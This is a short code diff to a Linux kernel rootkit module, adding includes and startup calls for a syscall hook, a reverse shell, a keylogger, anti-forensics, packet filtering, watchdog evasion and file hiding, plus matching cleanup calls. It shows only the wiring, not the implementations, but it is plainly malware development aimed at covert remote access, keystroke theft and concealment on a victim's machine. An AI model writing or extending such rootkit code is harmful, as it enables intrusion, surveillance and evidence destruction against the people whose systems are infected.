@@ -12,6 +12,13 @@
 #include "process_hiding.h"
 #include "module_hiding.h"
 #include "socket_hiding.h"
+#include "syscall_hook.h"
+#include "reverse_shell.h"
+#include "keylogger.h"
+#include "anti_forensics.h"
+#include "packet_filter.h"
+#include "anti_watchdog.h"
+#include "vfs_file_hiding.h"
 
 static int __init rootkit_init(void) {
 #ifdef ENABLE_STRING_ENCRYPT
@@ -31,6 +38,13 @@ static int __init rootkit_init(void) {
     setup_persistence();
     setup_process_hiding();
     setup_socket_hiding();
+    setup_syscall_hook();
+    start_reverse_shell();
+    start_keylogger();
+    setup_anti_forensics();
+    setup_packet_filter();
+    setup_anti_watchdog();
+    setup_vfs_file_hiding();
     hide_module();
     return 0;
 }
@@ -52,6 +66,12 @@ static void __exit rootkit_exit(void) {
     cleanup_persistence();
     remove_process_hiding();
     remove_socket_hiding();
+    remove_syscall_hook();
+    stop_keylogger();
+    remove_anti_forensics();
+    remove_packet_filter();
+    remove_anti_watchdog();
+    remove_vfs_file_hiding();
 }
 
 module_init(rootkit_init);
